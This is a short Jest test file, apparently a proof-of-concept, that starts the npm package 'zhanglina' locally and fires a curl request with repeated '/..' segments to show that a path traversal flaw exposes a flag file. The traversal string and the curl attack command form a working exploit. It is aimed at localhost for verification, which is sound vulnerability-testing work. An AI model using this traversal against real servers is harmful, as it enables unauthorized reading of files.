//
const path = require("path");
const { sleep } = require("sleep");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in zhanglina", (done) => {
    const fs = require("fs");
    const sleep =require('sleep');
    const { exec } = require("child_process");
    let hostsFile = fs.readFileSync(pathToFlag).toString();

    let server = 'node ./node_modules/zhanglina/index.js'; //to start the server
    let exe=exec(server, (error, stdout) => {});//starting the server
    //console.log(exe.pid)
    sleep.sleep(2);
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${genstr()}"`;

    exec(attack_string, (error, stdout) => {//attack
      let out = false;
      if (stdout.includes(hostsFile))
      {
        out = true;
      }  
      expect(out).toBe(true);
      done();
    });
    
});
